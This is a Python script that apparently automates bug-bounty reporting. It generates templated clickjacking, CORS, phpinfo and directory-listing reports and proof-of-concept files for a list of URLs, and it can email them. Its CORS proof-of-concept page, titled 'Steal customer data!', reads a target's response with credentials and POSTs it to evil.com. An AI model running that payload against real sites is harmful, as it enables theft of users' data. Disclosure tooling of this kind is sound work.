from urllib.request import urlopen
import requests
from sys import argv, exit
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


__author__ = 'HARSHAD_PACHORE'
def temp1():
    print(bcolors.BOLD + "\nChoice Email Templet : \n\n 1] Clickjaking Report \n 2] CORS Report \n 3] PHPINFO Page \n 4] Directory listing \n 5] Exit \n 6] Back " + bcolors.ENDC)
    val1 = int(input(bcolors.OKCYAN +"\nEnter your choice : "+ bcolors.ENDC))
    return val1

#send mail
def sendmail():
    msg = MIMEMultipart()
    filename="Report#"
    if str(argv[4])=="-n":
        fromaddr = str(input(bcolors.OKCYAN+"\nEnter Senders email ID : "+bcolors.ENDC))
        toaddr = str(input(bcolors.OKCYAN+"\nEnter Recivers email ID : "+bcolors.ENDC))
        passw=str(input(bcolors.OKCYAN+"\nEnter Password : "+bcolors.ENDC))
        name=str(input(bcolors.OKCYAN+"\nEnter Your Name : "+bcolors.ENDC))
        #n=int(input(bcolors.OKCYAN+"\nHow many attachments yo want to add : "+bcolors.ENDC))
        a=1
    else:
        fromaddr=str(argv[4])
        toaddr=str(argv[5])
        passw=str(argv[6])
        name=str(argv[7])
        a=1
        #n=int(argv[8])


        
    while True:
        
        val1=temp1()

        n=1
        if val1<=6:
            if val1==6:
                main1()
            elif val1==5:
                exit()
            else:
                st=str(input(bcolors.OKCYAN+"Enter Report Nunmber : "+bcolors.ENDC))
            
        else:
            print(bcolors.FAIL+"\nInvalid ! "+bcolors.ENDC)
            continue

        while a<=n:
            if val1==1 :
                n=2
                path="./CLICLJ/Report#"
                if a%2==0:
                    filename="Report#"
                    ext=".docx"
                else:
                    filename="POC"
                    ext=".html"
            elif val1==2 :
                n=2
                path="./CORS/Report#"
                if a%2==0:
                    filename="Report#"
                    ext=".docx"
                else:
                    filename="POC"
                    ext=".html"
            elif val1==3:
                n=2
                path="./PHPINFO/Report#"
                if a%2==0:
                    filename="Report#"
                    ext=".docx"
                else:
                    filename="POC"
                    ext=".jpg"
            elif val1==4:
                n=2
                path="./DirectoryListing/Report#"
                if a%2==0:
                    filename="Report#"
                    ext=".docx"
                else:
                    filename="POC"
                    ext=".jpg"
            
            
            
            filename =filename+st+ext
            path=path+st+"/"+filename
            attachment = open(path, "rb")
            p = MIMEBase('application', 'octet-stream')
            p.set_payload((attachment).read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
            msg.attach(p)
            a=a+1
    
        msg['From'] = fromaddr
        msg['To'] = toaddr
        msg['Subject'] = "Vulnerability Report"
        body = "Hello,\nI am "+name+". I would like to report a security issue. Details are attached below \nRegards,\n"+name+"."
        msg.attach(MIMEText(body, 'plain'))
        a=1

        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(fromaddr, passw)
        text = msg.as_string()
        s.sendmail(fromaddr, toaddr, text)
        print(bcolors.OKGREEN+"\nMail Sent.\n"+bcolors.ENDC)
        s.quit()
        


#PHPINFO POC 
def create_poc3(url,incr):
    BASE = 'https://render-tron.appspot.com/screenshot/'
    url1 = str(url)
    print(url1)
    path = 'POC'+str(incr)+'.jpg'
    save_path = './PHPINFO/Report#'+str(incr)
    completeName = os.path.join(save_path, path)
    response = requests.get(BASE + url1 + "/?width=1440&height=825", stream=True)
    if response.status_code == 200:
        with open(completeName, 'wb') as file:
            for chunk in response:
                file.write(chunk)   

def create_poc4(url,incr):
    BASE = 'https://render-tron.appspot.com/screenshot/'
    url1 = str(url)
    print(url1)
    path = 'POC'+str(incr)+'.jpg'
    save_path = './DirectoryListing/Report#'+str(incr)
    completeName = os.path.join(save_path, path)
    response = requests.get(BASE + url1 + "/?width=1440&height=825", stream=True)
    if response.status_code == 200:
        with open(completeName, 'wb') as file:
            for chunk in response:
                file.write(chunk) 

#DIRECTORY LISTING
def create_rep4(url,date,incr):
    ''' create HTML page of given URL '''

    code = """
Name: Harshad Pachore
Contact: pachoreharshad21@gmail.com
Date : {}

Vulnerability name: Directory Listing

Vulnerable Url: {}

Summary: 
Researcher has found a directory listing exposure to websites. A directory listing provides an attacker with the complete index of all the resources located inside of the directory as well as download or access its contents. 
While the researcher did not dig deeper into the available files, it might be possible that these websites host sensitive information like private videos which can publicly be downloaded or accessed by any user.
Impact:
A directory listing provides an attacker with the complete index of all the resources located inside of the directory. The specific risks and consequences vary depending on which files are listed and accessible. The files can possibly expose sensitive information as well as sensitive files like private videos or photos.

POC Screenshot attached


    """.format(date,url)
    path = 'Report#'+str(incr)+'.docx'
    save_path = './DirectoryListing/Report#'+str(incr)
    completeName = os.path.join(save_path, path)
    os.mkdir(save_path)
    with open(completeName, "w") as f:
        f.write(code)
        f.close()

#PHP INFO REPORT

def create_rep3(url,date,incr):
    ''' create HTML page of given URL '''

    code = """
Name: Harshad Pachore
Contact: pachoreharshad21@gmail.com
Date : {}

Vulnerability name: PHP info page disclosure 

Vulnerable Url’s:  {}

Summary:
1.php is a debug functionality that prints out detailed information on both the system and the PHP configuration.
Step-by-step Reproduction Instructions
1.Go to : {}
Impact
An attacker can obtain information such as:
•Exact PHP version.
•Exact OS and its version.
•Details of the PHP configuration.
•Loaded PHP extensions and their configurations.
This information can help an attacker gain more information on the system. After gaining detailed information, the attacker can research known vulnerabilities for that system under review. The attacker can also use this information during the exploitation of other vulnerabilities
Ref :
US. DOD :  https://hackerone.com/reports/1050912
https://hackerone.com/reports/165930
POC Screenshot attached

    """.format(date,url,url)
    path = 'Report#'+str(incr)+'.docx'
    save_path = './PHPINFO/Report#'+str(incr)
    completeName = os.path.join(save_path, path)
    os.mkdir(save_path)
    with open(completeName, "w") as f:
        f.write(code)
        f.close()
    
#CLICKJAKING REPORT
def create_rep1(url,date,incr):
    ''' create HTML page of given URL '''
    code = """
Name: Harshad Pachore
Contact: pachoreharshad21@gmail.com
Date: {}


Issue : {} is vulnerable to Clickjacking attacks due to missing X-Frame-Options 

While performing security testing of your website I have found the vulnerability called Clickjacking.


What is Clickjacking ?
Clickjacking (User Interface redress attack, UI redress attack, UI redressing) is a malicious technique of tricking a Web user into clicking on something different from what the user perceives they are clicking on, thus potentially revealing confidential information or taking control of their computer while clicking on seemingly innocuous web pages.
The server didn't return an X-Frame-Options header which means that this website could be at risk of a clickjacking attack. The X-Frame-Options HTTP response header can be used to indicate whether or not a browser should be allowed to render a page in a <frame> or <iframe>. Sites can use this to avoid clickjacking attacks, by ensuring that their content is not embedded into other sites.
This vulnerability affects Web Server.

Steps to Reproduce / POC

Vulnerable Url: {}

Put above url in the code of iframe, which is given below

<!DOCTYPE HTML>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<title>I Frame</title>
</head>
<body>
<h3>clickjacking vulnerability</h3>
<iframe src="{}”  height="550px" width="700px"></iframe>
</body>
</html>

Reference : 
https://hackerone.com/reports/728004
https://hackerone.com/reports/389145
https://hackerone.com/reports/231434

Notice that site is visible in the Iframe
POC is in the attachments. Thanks, waiting for your response.


    """.format(date,url,url,url)
    path = 'Report#'+str(incr)+'.docx'
    save_path = './CLICKJ/Report#'+str(incr)
    completeName = os.path.join(save_path, path)
    os.mkdir(save_path)
    with open(completeName, "w") as f:
        f.write(code)
        f.close()

def create_poc(url,incr):
    ''' create HTML page of given URL '''

    code = """
<!DOCTYPE HTML>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<title>I Frame</title>
</head>
<body>
<h3>clickjacking vulnerability</h3>
<iframe src="{}”  height="700px" width="700px"></iframe>
</body>
</html>
    """.format(url)
    path = 'POC'+str(incr)+'.html'
    save_path = './CLICKJ/Report#'+str(incr)
    completeName = os.path.join(save_path, path)
    with open(completeName, "w") as f:
        f.write(code)
        f.close()

# CORS REPORT

def create_poc2(url,incr):
    ''' create HTML page of given URL '''
    c1="{"
    c2="}"

    code = """
<!DOCTYPE html>
<html>
<body>
<center>
<h3>Steal customer data!</h3>
<html>
<body>
<button type='button' onclick='cors()'>Exploit</button>
<p id='demo'></p>
<script>
function cors() {}
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {}
if (this.readyState == 4 && this.status == 200) {}
var a = this.responseText; // Sensitive data from blog.yelp.com about user account
document.getElementById("demo").innerHTML = a;
xhttp.open("POST", "http://evil.com", true);// Sending that data to Attacker's website
xhttp.withCredentials = true;
console.log(a);
xhttp.send("data="+a);
{}
{};
xhttp.open("GET", "{}", true);
xhttp.withCredentials = true;
xhttp.send();
{}
</script>
</body>
</html>
    """.format(c1,c1,c1,c2,c2,url,c2)
    path = 'POC'+str(incr)+'.html'
    save_path = './CORS/Report#'+str(incr)
    completeName = os.path.join(save_path, path)
    with open(completeName, "w") as f:
        f.write(code)
        f.close()

def create_rep2(url,date,incr):
    ''' create HTML page of given URL '''
    code = """
Harshad Pachore
pachoreharshad21@gmail.com
Date : {}

Vulnerability name: Bypassing CORS Misconfiguration Leads to Sensitive Exposure  
Vulnerable Url: {}
It's possible to get information about the users registered (such as: id, name, login name, etc.) without authentication in Wordpress via API on  {}

By default Wordpress allow public access to Rest API to get informations about all users registered on the system. Platform(s) Affected: [website]  {}
Reference  :
U. S. DOD : https://hackerone.com/reports/896093
Impact
1) It's possible to get all the users registered on the system and create a bruteforce directed to these users. 
2) Cross Misconfiguration -Leakage Sensitive Information
Steps to Reproduce
1) Repreat URL Vulnerable to Burp Suite 
2) If you add the Origin-parameter to the Request-header, the responsive header will reject 
3) Bypassing Using Exploit CORS-With Sensitive 
4) Open Request Vulnerability URL in /wp-json/` , when you open the url, you can see path-routes`` disclousure
Proof On Concept:

6) Open CORS.html file attached with report in browser , sensitive has been exposure

POC Screenshots and html file attached :

Suggested Mitigation/Remediation Actions

There are 2 ways that it's possible to fix this problem. 
FIX 1 - It's possible to remove this access for anyone by change the source code where when someone request the Rest API and the server send a 404 (Not Found) message for the user who made the request. Reference: https://github.com/WP-API/WP-API/issues/2338 
FIX 2 - It's also possible to create a rewrite rule on .htaccess (if the webserver it's Apache) to redirect any request that contain restroute (eg.: "^.restroute=/wp/") to a Not Found (404) or a Default Page.

POC Screenshot,HTML file attached.

    """.format(date,url,url,url,url)
    path = 'Report#'+str(incr)+'.docx'
    save_path = './CORS/Report#'+str(incr)
    completeName = os.path.join(save_path, path)
    os.mkdir(save_path)
    with open(completeName, "w") as f:
        f.write(code)
        f.close()

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def banner():
    print( bcolors.HEADER +"""\
____________________________________________________________________
 ____  _____ ____   ___  ____ _______        _____ ____ _____ _____ 
|  _ \| ____|  _ \ / _ \|  _ \_   _\ \      / /_ _|  _ \_   _| ____|
| |_) |  _| | |_) | | | | |_) || |  \ \ /\ / / | || |_) || | |  _|  
|  _ <| |___|  __/| |_| |  _ < | |   \ V  V /  | ||  _ < | | | |___ 
|_| \_\_____|_|    \___/|_| \_\|_|    \_/\_/  |___|_| \_\|_| |_____| """+ bcolors.ENDC + bcolors.OKBLUE +"""
                                                       (Version 1.0)  """ + bcolors.ENDC + bcolors.FAIL +"""
    #Developed By harsh21_p #Contact:pachoreharshad21@gmail.com """ + bcolors.ENDC + bcolors.OKGREEN + """ 

            THIS TOOL IS FOR BASIC VULNERAILITY SCANING """+bcolors.ENDC+ bcolors.HEADER + """
____________________________________________________________________ 
   """+ bcolors.ENDC)

def main1():
    ''' Everything comes together '''
    try: sites = open(argv[1], 'r').readlines()
    except: print("[*] Usage: python(3) clickjacking_tester.py <file_name>"); exit(0)
    dat=str(argv[2])
    if str(argv[3])=="-h":
        
        print(bcolors.BOLD + "\nChoice Report Templet : \n\n 1] Clickjaking Report \n 2] CORS Report \n 3] PHPINFO Page \n 4] Directory listing \n 5] Send mail \n 6] Exit \n"+ bcolors.ENDC)
        val = int(input(bcolors.OKCYAN +"\nEnter your choice : "+ bcolors.ENDC))
    else:
        val=int(argv[3])
    incr = 1

    for site in sites[0:]:
        
        if val==1 :
            print(bcolors.OKBLUE +"\n[*]Writing Report for "+ bcolors.ENDC + bcolors.OKGREEN + site + bcolors.ENDC)
            try:create_rep1(site.split('\n')[0],dat,incr)
            except: print(bcolors.FAIL+"\nSomething wents wrong !\n"+bcolors.ENDC); exit(0)
            print(bcolors.HEADER +"Report Created.\n"+bcolors.ENDC)
            try:create_poc(site.split('\n')[0],incr)
            except: print(bcolors.FAIL+"\nSomething wents wrong !\n"+bcolors.ENDC); exit(0)
            print(bcolors.OKCYAN+" [*] Created a Report & POC and saved to Report.docx & <URL>.html"+bcolors.ENDC)
            incr=incr+1
        elif val==2 :
            print(bcolors.OKBLUE +"\n[*]Writing Report for "+ bcolors.ENDC + bcolors.OKGREEN + site + bcolors.ENDC)
            try:create_rep2(site.split('\n')[0],dat,incr)
            except: print(bcolors.FAIL+"\nSomething wents wrong !\n"+bcolors.ENDC); exit(0)
            print("Report Created.\n")
            try:create_poc2(site.split('\n')[0],incr)
            except: print(bcolors.FAIL+"\nSomething wents wrong !\n"+bcolors.ENDC); exit(0)
            print(bcolors.OKCYAN+" [*] Created a Report & POC and saved to Report.docx & <URL>.html"+bcolors.ENDC)
            incr=incr+1
        elif val==3:
            print(bcolors.OKBLUE +"\n[*]Writing Report for "+ bcolors.ENDC + bcolors.OKGREEN + site + bcolors.ENDC)
            try:create_rep3(site.split('\n')[0],dat,incr)
            except: print(bcolors.FAIL+"\nSomething wents wrong !\n"+bcolors.ENDC); exit(0)
            print(bcolors.HEADER +"Report Created.\n"+bcolors.ENDC)
            try:create_poc3(site.split('\n')[0],incr)
            except: print(bcolors.FAIL+"\nSomething wents wrong !\n"+bcolors.ENDC); exit(0)
            print(bcolors.OKCYAN+" [*] Created a Report & POC and saved to Report.docx & Screenshot"+bcolors.ENDC)
        elif val==4:
            print(bcolors.OKBLUE +"\n[*]Writing Report for "+ bcolors.ENDC + bcolors.OKGREEN + site + bcolors.ENDC)
            try:create_rep4(site.split('\n')[0],dat,incr)
            except: print(bcolors.FAIL+"\nSomething wents wrong !\n"+bcolors.ENDC); exit(0)
            print(bcolors.HEADER +"Report Created.\n"+bcolors.ENDC)
            try:create_poc4(site.split('\n')[0],incr)
            except: print(bcolors.FAIL+"\nSomething wents wrong !\n"+bcolors.ENDC); exit(0)
            print(bcolors.OKCYAN+" [*] Created a Report & POC and saved to Report.docx & Screenshot"+bcolors.ENDC)
        elif val==5:
            sendmail()
        elif val==6:
                exit()
        else:
            print(bcolors.FAIL+"I\nnvalid ! "+bcolors.ENDC)
def main():
    banner()
    try:main1()
    except: print(bcolors.FAIL+"\nSomething wents wrong !\n"+bcolors.ENDC); exit(0)
		
if __name__ == '__main__': main()